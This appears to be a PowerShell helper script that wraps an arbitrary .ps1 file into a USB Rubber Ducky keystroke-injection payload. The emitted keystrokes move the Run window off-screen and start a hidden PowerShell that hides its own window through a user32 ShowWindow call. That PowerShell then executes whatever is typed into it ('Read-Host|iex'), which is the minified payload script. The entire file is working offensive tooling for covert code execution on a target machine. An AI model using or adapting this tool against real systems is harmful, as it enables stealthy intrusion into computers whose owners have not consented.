# Drag a ps1 file on to here to have it prepared for the ducky.
#
# Pushes the actual PowerShell script in using char capture, allowing a
# relatively arbitrary length payload.
#
param([string]$scriptFileName)

$script = Get-Content $scriptFileName -Raw
$outputFile = "${scriptFileName}.ducky.txt"

Import-Module "$PSScriptRoot\minification\minJS.psm1"
$minifiedScript = minify -InputData $script -InputDataType ps1

"DELAY 5000",
"GUI r",
"DELAY 250",
"ALT SPACE",
"STRING M",
"LEFT",
"REPEAT 40",
"ENTER",
'STRING powershell -w hidden iex ''(Add-Type n -pas -m ''''[DllImport(\"user32\")]public static extern int ShowWindow(int h,int n);'''')::ShowWindow((gps -Id $pid).MainWindowHandle,0);Read-Host|iex''',
"ENTER",
"DELAY 1000",
"STRING $minifiedScript",
"ENTER" | Out-File -e "ASCII" "$outputFile"
